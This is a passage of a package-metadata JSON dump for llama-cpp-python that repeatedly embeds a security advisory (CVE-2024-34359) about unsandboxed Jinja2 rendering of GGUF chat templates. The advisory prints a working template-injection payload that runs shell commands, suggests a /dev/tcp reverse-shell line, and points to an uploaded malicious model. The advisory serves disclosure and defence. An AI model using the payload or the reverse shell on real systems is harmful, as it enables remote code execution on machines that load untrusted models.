`sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.4":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.4/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.4","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7b26be5c224560ccbe64592afbdbe0710ae5b0a8413e1416cc8c2c0b093b713b","md5":"6eb2bc173c49d2150fc0712bd15f8787","sha256":"84e6f266dbff163c84890793d207fdd5947214c3068750b6cb3be48b89420d19"},"downloads":-1,"filename":"llama_cpp_python-0.2.4.tar.gz","has_sig":false,"md5_digest":"6eb2bc173c49d2150fc0712bd15f8787","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":1546007,"upload_time":"2023-09-14T03:30:16","upload_time_iso_8601":"2023-09-14T03:30:16.144535Z","url":"https://files.pythonhosted.org/packages/7b/26/be5c224560ccbe64592afbdbe0710ae5b0a8413e1416cc8c2c0b093b713b/llama_cpp_python-0.2.4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.40":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.40/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.40","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1ad2dbf69d882517a534c5640e7b7f1cca360882cbd53c8c5c25ff0a7a854e07","md5":"668dff1239a6164a6fdcdc4ea5b57939","sha256":"10ec2855eed5094fb47476c312d613919469e4763a421b40f9e43a332a15898e"},"downloads":-1,"filename":"llama_cpp_python-0.2.40.tar.gz","has_sig":false,"md5_digest":"668dff1239a6164a6fdcdc4ea5b57939","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":11171973,"upload_time":"2024-02-12T21:40:12","upload_time_iso_8601":"2024-02-12T21:40:12.068674Z","url":"https://files.pythonhosted.org/packages/1a/d2/dbf69d882517a534c5640e7b7f1cca360882cbd53c8c5c25ff0a7a854e07/llama_cpp_python-0.2.40.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.41":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.41/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.41","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"3573b2abe489ae7a7fbe096266457a00a8f801b83c6929c9ee7a2fd0c43baff0","md5":"343e0dd9109b6e00b4e6f155d2cb01a3","sha256":"959bce7511c9be7456c7add687935deacceaeaa491efe546de0aafa87c60cfae"},"downloads":-1,"filename":"llama_cpp_python-0.2.41.tar.gz","has_sig":false,"md5_digest":"343e0dd9109b6e00b4e6f155d2cb01a3","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10717996,"upload_time":"2024-02-13T07:48:59","upload_time_iso_8601":"2024-02-13T07:48:59.394677Z","url":"https://files.pythonhosted.org/packages/35/73/b2abe489ae7a7fbe096266457a00a8f801b83c6929c9ee7a2fd0c43baff0/llama_cpp_python-0.2.41.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": 